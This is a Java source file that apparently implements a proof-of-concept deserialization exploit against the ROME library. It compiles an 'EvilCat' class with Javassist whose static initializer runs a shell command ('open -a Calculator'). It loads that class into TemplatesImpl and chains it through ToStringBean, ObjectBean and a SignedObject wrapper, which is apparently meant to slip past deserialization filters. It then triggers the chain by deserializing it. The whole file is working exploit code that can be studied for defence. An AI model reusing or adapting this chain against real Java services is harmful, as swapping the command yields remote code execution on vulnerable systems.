package com.ocean;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.security.*;

import java.util.HashMap;
public class Rome_SignedObject_ToStringBean_twice {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field f = obj.getClass().getDeclaredField(fieldName);
        f.setAccessible(true);
        f.set(obj, value);
    }
    public static CtClass getEvilClass() throws CannotCompileException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ct = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        ct.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        ct.setName(randomClassName);
        ct.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        return ct;
    }
    public static HashMap getPayload(Class clazz, Object obj) {
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, new ToStringBean(clazz, obj));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "rand");
        return hashMap;
    }
    public static void Unser(Object obj) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        ois.readObject();
    }
    public static void main(String[] args) throws NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        byte[][] bytes = new byte[][]{getEvilClass().toBytecode()};
        setFieldValue(templatesImpl, "_bytecodes", bytes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templatesImpl, "_name", "x");
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        HashMap hashMap1 = getPayload(Templates.class, templatesImpl);
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));
        HashMap hashMap2 = getPayload(SignedObject.class, signedObject);
        Unser(hashMap2);
    }
}
